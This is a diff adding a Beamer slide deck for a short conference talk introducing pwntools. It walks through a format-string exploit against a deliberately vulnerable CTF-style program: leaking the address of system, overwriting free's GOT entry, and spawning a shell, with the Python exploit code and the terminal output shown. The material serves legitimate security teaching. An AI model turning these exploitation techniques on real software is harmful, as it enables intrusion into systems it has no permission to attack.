@@ -1,0 +1,162 @@
+\documentclass[t]{beamer}
+\usepackage[utf8]{inputenc}
+\usepackage[danish]{babel}
+
+\usepackage{listings}
+
+\lstdefinestyle{customc}{
+  belowcaptionskip=1\baselineskip,
+  breaklines=true,
+  xleftmargin=\parindent,
+  language=C,
+  showstringspaces=false,
+  basicstyle=\footnotesize\ttfamily,
+  keywordstyle=\bfseries\color{green!40!black},
+  commentstyle=\itshape\color{purple!40!black},
+  identifierstyle=\color{blue},
+  stringstyle=\color{orange},
+}
+
+\lstdefinestyle{custompy}{
+  belowcaptionskip=1\baselineskip,
+  breaklines=true,
+  xleftmargin=\parindent,
+  language=C,
+  showstringspaces=false,
+  basicstyle=\footnotesize\ttfamily,
+  keywordstyle=\bfseries\color{green!40!black},
+  commentstyle=\itshape\color{purple!40!black},
+  identifierstyle=\color{blue},
+  stringstyle=\color{orange},
+}
+
+\title{Short and confusing introduction to Pwntools}
+\author{Kokjo / Jonas Rudloff}
+
+\begin{document}
+\frame[plain]{\titlepage}
+
+\begin{frame}
+    \frametitle{What is pwntools?}
+    \begin{itemize}
+        \pause \item Pwntools is exploitation framework
+        \pause \item For rapidly developing exploits.
+        \pause \item Eg. for CTF competitions
+        \pause \item Originally developed at the student organization Pwnies at DIKU
+        \pause \item https://github.com/Gallopsled/pwntools
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Sample pwnable program}
+    \lstinputlisting[language=C,style=customc]{../pwnable.c}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Exploitation with Pwntools!}
+    We are going the attack the format string bug in the program,
+    \pause but first we need to be able to interact with the program
+    \pause
+    \begin{lstlisting}[language=Python, style=custompy]
+    from pwn import *
+    r = process("./pwnable")
+    r.interactive()
+    \end{lstlisting}
+    \pause Yay!
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Exploitation plan}
+    \begin{itemize}
+        \pause \item Leak address of \texttt{system}
+        \pause \item ... change the got entry of \texttt{free} to be the address of \texttt{system}
+        \pause \item ... and choose our name to be \texttt{/bin/sh}
+    \end{itemize}
+    \pause
+    \begin{lstlisting}[language=Python, style=custompy]
+ from pwn import *
+ r = process("./pwnable")
+ r.sendlineafter("What's your name?", "/bin/sh")
+    \end{lstlisting}
+    \pause and we can call printf like
+    \begin{lstlisting}[language=Python, style=custompy]
+ @FmtStr
+ def printf(s):
+     r.sendline(s)
+     return r.recvuntil("today?\n", drop=True)
+    \end{lstlisting}
+    \texttt{FmtStr} is pwntools magic,
+    \pause which escalates a format string vulnerability to a full memory leaker,
+    \pause and a write-what-where.
+    \pause Using standard format string techniques.
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Leaking the address of \texttt{system}}
+    \pause Idea:
+    \begin{itemize}
+            \pause \item Do what the dynamic linker would do!
+            \pause \item We will use our memory leaker!
+            \pause \item Do pointer chasing and hashtable lookups inside ELF files.
+            \pause \item Pwntools have built-in support for this: DynELF!!
+    \end{itemize}
+    \begin{lstlisting}[language=python, style=custompy]
+ e = ELF("./pwnable")
+ d = DynELF(printf.leaker, elf=e)
+ system = d.lookup("system", "libc.so")
+    \end{lstlisting}
+    \pause
+    The variable \texttt{system} now contains the address of \texttt{system} inside the running process \texttt{./pwnable}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Overwriting the GOT entry of \texttt{free}}
+    \pause Easy!!!
+    \pause We will just use the format string exploit again!
+    \pause
+    \begin{lstlisting}[language=Python, style=custompy]
+ printf.write(e.got["free"], system)
+ printf.execute_writes()
+    \end{lstlisting}
+    \pause
+    What is left is just to call free, and we are done!
+    \pause
+    \begin{lstlisting}[language=Python, style=custompy]
+ r.sendline("quit") #Trigger, call system("/bin/sh")
+ r.clean()
+ r.interactive()
+    \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]
+    \begin{lstlisting}[style=custompy]
+[+] Opening connection to localhost on port 1337: Done
+[*] Found format string offset: 7
+[*] '/home/jonas/code/lightning-talk-33c3/pwnable'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE
+[+] Loading from '/home/jonas/code/lightning-talk-33c3/pwnable': 0xf77be930
+[+] Resolving 'system' in 'libc.so': 0xf77be930
+[*] Switching to interactive mode
+$ whoami
+pwnable
+$ cat flag
+omglol, hello 33C3!!!
+$ 
+    \end{lstlisting}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Final exploit}
+    \lstinputlisting[language=C,style=customc]{../doit.py}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{References}
+\end{frame}
+
+
+\end{document}
